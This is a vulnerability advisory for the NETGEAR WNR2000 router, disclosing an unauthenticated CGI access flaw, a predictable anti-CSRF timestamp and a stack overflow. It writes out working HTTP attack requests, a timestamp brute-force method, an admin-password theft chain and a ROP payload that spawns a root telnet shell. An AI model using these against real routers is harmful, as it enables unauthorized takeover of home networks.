@@ -1,0 +1,395 @@
+>> Stack buffer overflow vulnerability in NETGEAR WNR2000 router
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+==========================================================================
+Disclosure: 20/12/2016 / Last updated: 20/12/2016
+
+>> Background on the affected products:
+"Wirelessly connect all of your computers and mobile devices. N300 WiFi speed lets you simultaneously download, stream music and video, and game online. NETGEAR genie® makes it easy to setup and monitor your network. Parental controls keep your Internet experience safe and secure."
+
+
+>> Summary:
+The NETGEAR WNR2000 allows an administrator to perform a number of sensitive functions in the web interface through an apparent CGI script named apply.cgi. This script is invoked when changing Internet settings, WLAN settings, restore to factory defaults, reboot the router, etc.
+However apply.cgi is not really a script, but a function that is invoked in the HTTP server (uhttpd) when it receives that string in the URL. When reversing uhttpd, it was found that it also allows an unauthenticated user to perform the same sensitive admin functions if apply_noauth.cgi is invoked instead.
+Some of the functions, such as rebooting the router, can be exploited straight away by an unauthenticated attacker. Other functions, such as changing Internet, WLAN settings or retrieving the administrative password, require the attacker to send a "timestamp" variable attached to the URL that functions as a sort of anti-CSRF token.
+This function was reverse engineered and due to incorrect use of random number generation (details below) it is possible to identify the token in less than 1000 attempts with no other previous knowledge.
+
+Finally, a stack buffer overflow was also discovered, which combined with the apply_noauth.cgi vulnerability and the timestamp identifying attack allows an unauthenticated attacker to take full control of the device and execute code remotely.
+
+It should be noted that the WNR2000v5 does not have remote administration enabled by default on the latest firmware, and unless the administrator enables it, this attack is only possible in the LAN. Only the WNR2000v5 device was tested, but versions 3 and 4 of this router should also be vulnerable. At the time of the intial disclosure, there are over 10.000 vulnerable routers appearing in a Shodan search.
+
+Exploit code has been released with this advisory, but it is of "alpha" quality (see [1]). This exploit code will be improved and ported to Metasploit in the next week.
+
+
+>> Technical details:
+#1 
+Vulnerability: Information leakage
+NO CVE ASSIGNED
+Attack Vector: Remote
+Constraints: Can be exploited by an unauthenticated attacker. See below for other constraints.
+Affected versions:
+- WNR2000v5, all firmware versions (confirmed in hardware)
+- WNR2000v4, all firmware versions possibly affected (confirmed only by static analysis)
+- WNR2000v3, all firmware versions possibly affected (confirmed only by static analysis)
+
+The device leaks its serial number when performing a request to http://<device_web_portal>/BRS_netgear_success.html:
+HTTP/1.0 200 OK
+Server: uhttpd/1.0.0
+Date: Thu, 01 Jan 1970 00:11:42 GMT
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: 0
+Content-Type: text/html; charset="UTF-8"
+Connection: close
+
+<html>
+<head>
+</head>
+<body>
+<script>
+/* 22281: add sn after success href */
+var sn="4D01615V0009D";                      <--- serial number of the device
+(...)
+
+This vulnerability is useful for further exploitation in #2.
+
+
+#2
+Vulnerability: Improper access control
+NO CVE ASSIGNED
+Attack Vector: Remote
+Constraints: Can be exploited by an unauthenticated attacker. See below for other constraints.
+Affected versions:
+- WNR2000v5, all firmware versions (confirmed in hardware)
+- WNR2000v4, all firmware versions possibly affected (confirmed only by static analysis)
+- WNR2000v3, all firmware versions possibly affected (confirmed only by static analysis)
+
+-----------------------
+The vulnerability
+-----------------------
+
+The WNR2000 router allows an administrator to perform sensitive actions by invoking the apply.cgi URL on the web server of the device. This special URL is handled by the embedded web server (uhttpd) and processed accordingly. 
+While reverse engineering uhttpd, it was discovered that another function, apply_noauth.cgi allows an unauthenticated user to perform sensitive actions on the device. For example, to reboot the router, the following request can be sent:
+
+====
+POST /apply_noauth.cgi?/reboot_waiting.htm HTTP/1.1
+Host: 192.168.1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+
+submit_flag=reboot&yes=Yes
+====
+
+To reset to factory defaults:
+====
+POST /apply_noauth.cgi?/pls_wait_factory_reboot.html HTTP/1.1
+Host: 192.168.1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+
+submit_flag=factory
+====
+
+Change WLAN settings:
+====
+POST /apply_noauth.cgi?/WLG_wireless.htm HTTP/1.1
+Host: 192.168.1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 754
+
+submit_flag=wlan&Apply=Apply&hidden_wlan_mode=&hidden_wlan_channel=&generate_flag=&old_length=&wl_sec_wpaphrase_len=17&wl_hidden_wpa_psk=somewifipassword&hidden_sec_type=&wep_press_flag=&wpa1_press_flag=0&wpa2_press_flag=1&wpas_press_flag=0&wps_change_flag=5&hidden_enable_guestNet=&hidden_enable_ssidbro=&hidden_allow_guest=&radiusServerIP=&opmode_bg=&wl_mode=&wl_ssid=1337Net&wl_WRegion=4&wl_hidden_wlan_channel=0&wl_hidden_wlan_mode=2&wl_hidden_sec_type=4&hidden_WpaeRadiusSecret=&hidden_WpaeRadiusSecret_a=&wl_enable_ssid_broadcast=1&hidden_enable_video=&wl_tx_ctrl=&wl_apply_flag=1&ssid_bc=1&ssid=NETGEAR09&wla1ssid=NETGEAR-5G_Guest1&wlg1ssid=NETGEAR-Guest&WRegion=4&w_channel=0&opmode=2&opmode54=1&security_type=WPA2-PSK&passphrase=somewifipassword
+====
+
+Change password recovery settings for the administrator account:
+====
+POST /apply_noauth.cgi?/PWD_password.htm%20timestamp=26123148 HTTP/1.1
+Host: 192.168.1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 188
+
+submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=secretanswer1&question2=2&answer2=secretanswer2
+====
+
+These are just examples, there is a lot more functionality that can be accessed using apply_noauth.cgi. However, apart from the three first examples, most actions will require knowledge of a "timestamp" variable which is appended to the URL (like in the fourth example). Identifying this timestamp is non-trivial and will be explained in detail.
+
+-----------------------
+Timestamp generation
+-----------------------
+
+This timestamp variable is generated each time a user accesses a page. For example, to change the WLAN settings, a user has to visit the WLG_wireless.htm page. The timestamp variable will be generated when that page is accessed, and stored in the device configuration. 
+Each time the page is visited, a new timestamp is generated and embedded in the page. Even if the page has not been accessed by a user since the device has rebooted, the timestamp variable will still be preset in the configuration. It was not investigated why this occurs but most likely this timestamp is generated and saved at some point in the boot process. 
+Note that each page or function will have a different timestamp at any time, stored in the device configuration. It is also crucial to note that an unauthenticated user cannot access any of the pages, so it cannot force generation of a timestamp or retrieve its value.
+
+The function responsible for this timestamp generation is at 0x4101E8 (firmware version 1.0.0.34 for the WNR2000v5) and it has a symbol name of get_timestamp.
+The following C code shows how the timestamp generation is done:
+
+  long t0, t1, t2, t3, t4, hi;
+  int i;
+  float final;
+
+  // seed srand with NULL is the same as seeding it with the current UNIX system time
+  srand(0);
+  
+  t0 = rand();
+  t1 = 0x17dc65df;
+  hi = (int)((t0 * t1) >> 32);
+  t2 = t0 >> 31;
+  t3 = hi >> 23;
+  t3 = t3 - t2;
+  t4 = t3 * 0x55d4a80;
+  t0 = t0 - t4;
+  t0 = t0 + 0x989680;  
+    
+  final = (float) t0;
+  printf("%9.f\n", final);
+  
+The final cast to float is crucial, as this will force the number to be rounded using IEEE 754 rules, and will slightly increase or decrease the final value. This is exactly what happens in the disassembled code, and the C code above can generate timestamps with 100% accuracy. 
+Porting this code to Ruby (in order to release exploit code, see [1]) was a challenge. First, the behaviour of srand and rand in ruby is completely different, so the actual libc functions had to be ported line by line. Second, Ruby uses double precision floating point integers by default, so pack and unpack had to be used in order to force single precision float behaviour.
+
+-----------------------
+Achieving reliable exploitation
+-----------------------
+
+The unresolved problem for an unauthenticated attacker is that it needs to guess the current timestamp value in order to perform any of the attacks described above. This could be limited by first attempting all possible values in the current hour, current day, current month, current year in order. 
+However there is an optimal way to do it.
+
+One of the few actions that is possible for an unauthenticated attacker to execute without knowing the timestamp is to reboot the device. If the device is rebooted, then the attacker will know that the UNIX time used to seed srand and to generate the timestamp will be in the last 5 minutes or so (about the time it takes to reboot and for the attacker to re-connect to it). Therefore, to easily guess the timestamp, all that has to be done is the following:
+
+a) send a reboot request
+b) wait for the device to reboot and connect again to it (via WLAN or Ethernet)
+c) send a HTTP GET request to the device, and get its current time from the Date HTTP header
+d) using the algorithm above, seed srand with all possible values starting from the UNIX timestamp obtained from parsing the Date header minus 300 (60 seconds times 5 minutes)
+e) attempt to perform the intended function (factory reset, change WLAN, etc) by invoking the apply_noauth.cgi script with the correct parameters and each output from d) until the correct timestamp is hit and the function executed
+
+Using this technique, the bruteforce needed to guess the timestamp is greatly reduced, enabling an unauthenticated attacker to be successful 100% of the time (actual number of tries needed will vary approximately between 300 and 5000, but usually less than 1000).
+
+For WAN exploitation (when remote management is enabled) rebooting is not an option (as most likely the device will have a new IP address after boot); for this case, the best way to exploit the device is to start from the current time backwards and keep sending requests until the correct value is hit. 
+
+-----------------------
+Obtaining the admin password
+-----------------------
+
+With the possibility of resetting the password recovery settings, the attacker can now obtain the administrator password.
+After a successful password recovery reset using the algorithm detailed in "Achieving reliable exploitation", the attacker now has to:
+
+a1) Send a POST request to unauth.cgi with the serial number
+POST /apply_noauth.cgi?/unauth.cgi HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+
+submit_flag=match_sn&serial_num=<serial>&continue=+Continue+
+
+b1) Send a POST request to securityquestions.cgi with the answer to the security questions
+POST /apply_noauth.cgi?/securityquestions.cgi HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+
+submit_flag=security_question&answer1=secretanswer1&answer2=secretanswer2&continue=+Continue+
+
+c1) Finally, send a GET request to passwordrecovered.cgi and the admin username and password will be displayed:
+(...)
+<TR><TD colSpan=2>You have successfully recovered the admin password.</TD></TR>
+<TR><TD colSpan=2>&nbsp;</TD></TR>
+<TR >
+        <TD nowrap colSpan=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Router Admin Username: admin</TD>
+</TR>
+<TR>
+        <TD nowrap colSpan=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Router Admin Password: password</TD>
+(...)
+
+-----------------------
+Executing code as root
+-----------------------
+
+NETGEAR routers have a handy function that allows a user to enable a root console via telnet with a special magic packet. This magic packet is calculated with the MAC of the device, plus the administrator username and password, which is then MD5 hashed and Blowfish encrypted with "AMBIT_TELNET_ENABLE+" plus the password. For more details, see [2].
+
+Given that the its possible to retrieve the administator username and password as explained above, in order to execute code all that is needed is to send the magic packet with the script in [3], and connect to port 23 to land in a root shell with no futher authentication required.
+
+All of the above assumes the administrator password has been changed. If it hasn't, the executing code as root is trivial with the telnetenable script in [3].
+
+
+#3
+Vulnerability: Stack buffer overflow
+NO CVE ASSIGNED
+Attack Vector: Remote
+Constraints: Can be exploited by an unauthenticated attacker. See below for other constraints.
+Affected versions:
+- WNR2000v5, all firmware versions (confirmed in hardware)
+- WNR2000v4, all firmware versions possibly affected (confirmed only by static analysis)
+- WNR2000v3, all firmware versions possibly affected (confirmed only by static analysis)
+
+-----------------------
+Vulnerability details
+-----------------------
+
+The HTTP server in the device (uhttpd) handles access to *.cgi files in a special way. Instead of fetching a CGI file from the file system, it handles them internally according to the URL. This mechanism has already been described in vulnerability #2 and in the Summary section.
+A key parameter of the apply*.cgi URL is the submit_flag, which will determine which uhttpd function will be invoked when processing the request.
+
+If the following request is sent:
+POST /apply.cgi?/lang_check.html%20timestamp=14948715 HTTP/1.1
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 604
+
+submit_flag=select_language&hidden_lang_avi=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDDDDEEEEFFFFbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+A stack buffer overflow occurs, which can be seen when debugging the process in gdb:
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+(gdb) i r
+          zero       at       v0       v1       a0       a1       a2       a3
+ R0   00000000 00000001 00000000 00000054 00000000 7fae7ee1 ffffff87 000009c0 
+            t0       t1       t2       t3       t4       t5       t6       t7
+ R8   2ab96420 00000000 00000001 fffffff8 fffffffe 00000001 00000000 00000000 
+            s0       s1       s2       s3       s4       s5       s6       s7
+ R16  41414141 42424242 43434343 44444444 00000002 00000025 0000002b 00000002 
+            t8       t9       k0       k1       gp       sp       s8       ra
+ R24  00000002 2ab5a170 2ab825f8 00000000 0048f4a0 7fae7f18 004b51b8 45454545 
+        status       lo       hi badvaddr    cause       pc
+      0000ff13 000f41db 000003dd 45454544 10800008 45454545 
+          fcsr      fir  restart
+      00000000 00000000 00000000 
+(gdb) x/32xw $sp
+0x7fae7f18:	0x46464646	0x62626262	0x62626262	0x62626262
+(...)
+
+The following registers can be controlled by an attacker:
+$ra/$pc = index 52 of hidden_lang_avi parameter (EEEE)
+$s0 = index 36 (AAAA)
+$s1 = index 40 (BBBB)
+$s2 = index 44 (CCCC)
+$s3 = index 48 (DDDD)
+$sp = index 56 (FFFF)
+
+This vulnerability will be analysed using firmware 1.0.0.34 for the WNR2000v5 router.
+The function at address 0x446428 is invoked to process the hidden_lang_avi parameter. This function extracts the parameter and then processes it as shown in a snippet below:
+(...) 
+LOAD:00446510                 la      $t9, strcpy
+LOAD:00446514                 addiu   $s1, $sp, 0x48+hidden_lang_avi_var
+LOAD:00446518                 move    $a1, hidden_lang_avi_str # hidden_lang_avi_str = $s0, obtained from the cgi value
+LOAD:0044651C                 jalr    $t9 ; strcpy     # first overflow occurs here
+LOAD:0044651C                                          # - copies hidden_lang_avi cgi param to hidden_lang_avi_var
+LOAD:00446520                 move    $a0, $s1
+LOAD:00446524                 b       loc_4464C4
+(snippet of function starting at 0x446428)
+
+As it can be seen, an overflow occurs here, but upon further investigation this is not actually where the crash occurs.
+Following the branch instruction, we then go to:
+LOAD:004464C4 loc_4464C4:                          
+LOAD:004464C4                 la      $t9, config_set
+LOAD:004464C8                 lui     $a0, 0x47  # 'G'
+LOAD:004464CC                 move    $a1, $s1            # $s1 points to the stack variable seen in the previous snippet as "hidden_lang_avi_var"
+LOAD:004464D0                 jalr    $t9 ; config_set
+LOAD:004464D4                 la      $a0, aNew_language  # "New_Language"
+LOAD:004464D8                 jal     check_language_file
+LOAD:004464DC                 move    $a0, $s1
+(snippet of function starting at 0x446428)
+
+The hidden_lang_avi_var string is then passed to check_language_file as the first parameter. This function does some further processing, but then passes it on to another function, region_search, again as the first parameter:
+LOAD:004463DC loc_4463DC:      
+LOAD:004463DC                 la      $t9, region_search
+LOAD:004463E0                 jalr    $t9 ; region_search
+LOAD:004463E4                 move    $a0, $s0    # $s0 contains the hidden_lang_avi_var passed on from 0x446428
+(snippet of function check_language_file)
+
+Which finally leads us to the function where the overflow occurs, region_search:
+LOAD:004130B0 region_search:              
+LOAD:004130B0
+LOAD:004130B0                 lui     $gp, 0x49  # 'I'
+LOAD:004130B4                 addiu   $sp, -0x50
+LOAD:004130B8                 la      $gp, unk_48F4A0
+LOAD:004130BC                 sw      $ra, 0x50+var_4($sp)
+LOAD:004130C0                 sw      $s3, 0x50+var_8($sp)
+LOAD:004130C4                 sw      $s2, 0x50+var_C($sp)
+LOAD:004130C8                 sw      $s1, 0x50+var_10($sp)
+LOAD:004130CC                 sw      $s0, 0x50+var_14($sp)
+LOAD:004130D0                 sw      $gp, 0x50+var_40($sp)
+LOAD:004130D4                 beqz    $a0, loc_4131F0
+LOAD:004130D8                 la      $t9, strcpy
+LOAD:004130DC                 addiu   $s2, $sp, 0x50+var_38   # stack variable which will be overflown
+LOAD:004130E0                 move    $a1, $a0                # $a0, AKA hidden_lang_avi_var from 0x446428
+LOAD:004130E4                 lui     $s3, 0x48  # 'H'
+LOAD:004130E8                 jalr    $t9 ; strcpy            # second overflow occurs here
+LOAD:004130EC                 move    $a0, $s2
+(snippet of region_search)
+
+As it can be seen above, a stack variable which is located at an offset of 0x38 is the one overflown and it is in this function that the crash shown in gdb above occurs. The first register we control, $s0, has its value stored at offset 0x14, which is stored in the stack 0x24 (36) bytes from the stack variable that gets overwritten.
+
+Note that this vulnerability can be exploited by an authenticated attacker (via the apply.cgi URL) or by an unauthenticated attacker that knows the timestamp parameter (via the apply_noauth.cgi parameter, and using the technique described in #1 to know the timestamp).
+
+-----------------------
+Exploitation
+-----------------------
+
+The NETGEAR WNR2000 is a MIPS device, and it does not have ASLR or NX, so this vulnerability can be exploited to execute shellcode on the stack.
+MIPS Cores have separate instruction and data caches so that an instruction can be read and a load or store done simultaneously [4]. Usually when writing MIPS exploits, one has to flush the caches before executing any shellcode that has been injected (see [4] for another example). There are at least six ways to achieve this:
+
+i) Use pure ROP / return-to-libc
+When using only ROP / ret-to-libc, the stack will simply be used to store data (where the next instruction is). The instructions used to execute code are already part of the program, and no modification of them is done. For this reason, there is no need to flush the caches when using pure ROP (as in no code in the stack is executed) or return-to-libc.
+
+ii) call libc's sleep()
+
+iii) call libc's cacheflush()
+
+iv) invoke MIPS cacheflush syscall (Linux example)
+  li      $v0, 0x1033     ; load $v0 with the syscall number
+  syscall 0
+
+v) issue instructions to flush the cache directly (kernel mode only, see [6], page 2; see also [4] (page 12-24))
+
+vi) Put the shellcode in the kseg1 memory segment (kernel mode only)
+This is in the memory range 0xa0000000 to 0xc0000000. For more details check [6].
+
+In order to reduce exploit complexity, approach i) will be taken, eliminating both the need to flush the cache and the need to write shellcode. The system() function can be invoked to start telnetd, download and execute a file with wget, etc.
+
+All firmware versions for the WNR2000v5 appear to use libuClibc-0.9.30.1.so, which makes gadget hunting easier. In this device, uClibc is loaded at a fixed address of 0x2AB24000, which makes it easy to write an exploit for all firmware versions. Luckily, only one gadget was needed to perform the attack.
+
+The ROP gadget will load $sp into $a0 (which will contain the system() command) and call $s0 (which will contain the address of system()):
+LOAD:0002462C                 addiu   $a0, $sp, 0x40+arg_0
+LOAD:00024630                 move    $t9, $s0
+LOAD:00024634                 jalr    $t9
+
+The stack needs to be set up in the following way:
+payload = 
+  'a' * 36      +                                                             # filler (trash the stack until we hit $s0)
+  system()      +                                                             # $s0
+  '1111'        +                                                             # $s1
+  '2222'        +                                                             # $s2
+  '3333'        +                                                             # $s3
+  gadget        +                                                             # gadget
+  'b' * 0x40    +                                                             # filler (discard these bytes because of gadget)
+  "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh"  # payload
+  
+This payload will have the final value of:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%2a%b7%87%d0111122223333%2a%b4%86%2cbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbkillall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh
+
+The payload is then sent in the hidden_lang_avi parameter which will then result in the telnetd server being started on port 23, running as root with no authentication. By simply connecting to port 23 a root shell is presented. 
+The only constraints for the payload is that it should not contain ampersand (&), percentage (%) or null characters. The uhttpd server will die after this attack is performed, but it is restarted by a watchdog every couple of minutes.
+
+
+>> Fix:
+NETGEAR did not respond to any emails, so THERE IS NO FIX for this vulnerability.
+It is recommended to replace this router with another make and model that supports OpenWRT firmware.
+
+Timeline of disclosure:
+26.09.2016: Email sent to NETGEAR (security@netgear.com) asking for PGP key, no response.
+28.10.2016: Email sent to NETGEAR (security@netgear.com) asking for PGP key, no response.
+26.11.2016: Disclosed vulnerability to CERT through their web portal.
+29.11.2016: Received reply from CERT. They indicated that NETGEAR does not cooperate with them, so they recommended getting CVE numbers from MITRE and releasing the vulnerability information
+            Email to MITRE requesting CVE numbers, no response.
+            Email sent to NETGEAR (security@netgear.com) asking for PGP key, no response.
+20.12.2016: Public disclosure.
+
+
+>> References:
+[1] msf link
+[2] https://wiki.openwrt.org/toh/netgear/telnet.console
+[3] https://github.com/insanid/netgear-telenetenable
+[4] http://cdn.imgtec.com/mips-training/mips-basic-training-course/slides/Caches.pdf
+[5] https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt
+[6] http://cdn.imgtec.com/mips-training/mips-basic-training-course/slides/Memory_Map.pdf
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
